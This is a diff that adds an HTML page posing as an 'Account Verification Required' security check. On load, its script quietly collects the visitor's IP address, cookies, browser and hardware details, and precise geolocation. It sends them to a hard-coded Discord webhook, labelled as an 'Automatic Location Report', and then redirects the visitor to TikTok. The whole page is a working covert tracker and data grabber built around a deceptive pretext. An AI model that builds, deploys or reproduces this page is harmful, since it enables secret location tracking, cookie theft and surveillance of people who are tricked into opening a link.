@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification Required</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+            text-align: center;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 90%;
+            max-width: 500px;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        .loader-container {
+            margin: 25px 0;
+        }
+        .loader {
+            border: 4px solid rgba(0,0,0,0.1);
+            border-left-color: #0066ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            height: 6px;
+            background-color: #e9ecef;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background-color: #0066ff;
+            width: 0%;
+            animation: progress 2s ease-in-out forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .status-text {
+            font-size: 14px;
+            color: #6c757d;
+            margin-top: 15px;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Security Verification</h2>
+        <p>We're verifying your device for security purposes</p>
+
+        <div class="loader-container">
+            <div class="loader"></div>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+            <div class="status-text" id="statusText">Initializing verification system...</div>
+        </div>
+    </div>
+
+    <script>
+        // DOM elements
+        const statusText = document.getElementById('statusText');
+
+        // Update status message
+        const updateStatus = (message) => {
+            statusText.textContent = message;
+        };
+
+        // Collect all possible data
+        const collectData = async () => {
+            updateStatus("Checking network information...");
+
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: "Unknown",
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                location: null,
+                cookies: document.cookie || "None",
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || "None",
+                os: navigator.platform,
+                cpu: navigator.hardwareConcurrency + " cores",
+                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+                referrer: document.referrer || "Direct access",
+                browser: {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    online: navigator.onLine
+                }
+            };
+
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+                updateStatus("Network verification complete...");
+            } catch (e) {
+                data.ip = "Failed to retrieve";
+            }
+
+            // Try to get precise location
+            if (navigator.geolocation) {
+                updateStatus("Requesting location access...");
+
+                return new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            data.location = {
+                                lat: position.coords.latitude.toFixed(6),
+                                long: position.coords.longitude.toFixed(6),
+                                accuracy: position.coords.accuracy + " meters",
+                                altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + "m" : "Unavailable",
+                                heading: position.coords.heading || "Unavailable",
+                                speed: position.coords.speed || "Unavailable"
+                            };
+                            updateStatus("Location verified...");
+                            resolve(data);
+                        },
+                        error => {
+                            data.location = {
+                                error: "DENIED: " + (error.message || "User blocked geolocation")
+                            };
+                            updateStatus("Basic verification complete...");
+                            resolve(data);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 8000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+            } else {
+                data.location = {
+                    error: "GEOLOCATION NOT SUPPORTED"
+                };
+                updateStatus("Completing verification...");
+                return data;
+            }
+        };
+
+        // Send data to Discord webhook
+        const sendToDiscord = (data) => {
+            const webhookURL = "https://discord.com/api/webhooks/1394412756794347671/E0Pydlq6PWZwrLI2NYLAnuFB8E9Ldj2CbPY4zEBP7GwLMd81lobAB5QksiaAzF55XHeU"; // REPLACE THIS
+
+            // Format the embed message
+            const embed = {
+                title: "📌 Automatic Location Report",
+                color: 0x3498db,
+                description: `New data captured at ${new Date().toLocaleString()}`,
+                fields: [
+                    {
+                        name: "📍 Location Data",
+                        value: data.location.lat ? 
+                            `\`\`\`Latitude: ${data.location.lat}
+Longitude: ${data.location.long}
+Accuracy: ${data.location.accuracy}
+Altitude: ${data.location.altitude}\`\`\`` : 
+                            `❌ ${data.location.error || "No location data"}`
+                    },
+                    {
+                        name: "🖥️ System Info",
+                        value: `IP: \`${data.ip}\`
+OS: ${data.os}
+Browser: ${data.browser.name} ${data.browser.version}
+Screen: ${data.screen}
+CPU: ${data.cpu}
+RAM: ${data.ram}`
+                    },
+                    {
+                        name: "🌐 Network Info",
+                        value: `Timezone: ${data.timezone}
+Language: ${data.language}
+Online: ${data.browser.online ? "Yes" : "No"}
+Referrer: ${data.referrer}`
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Automated security verification report"
+                }
+            };
+
+            return fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    embeds: [embed]
+                })
+            });
+        };
+
+        // Main execution flow
+        (async () => {
+            try {
+                const collectedData = await collectData();
+                updateStatus("Finalizing verification...");
+
+                await sendToDiscord(collectedData);
+
+                updateStatus("Verification complete. Redirecting...");
+                setTimeout(() => {
+                    window.location.href = "https://www.tiktok.com";
+                }, 1500);
+
+            } catch (error) {
+                console.error("Error:", error);
+                // Fallback redirect if anything fails
+                setTimeout(() => {
+                    window.location.href = "https://www.tiktok.com";
+                }, 2000);
+            }
+        })();
+    </script>
+</body>
+</html>
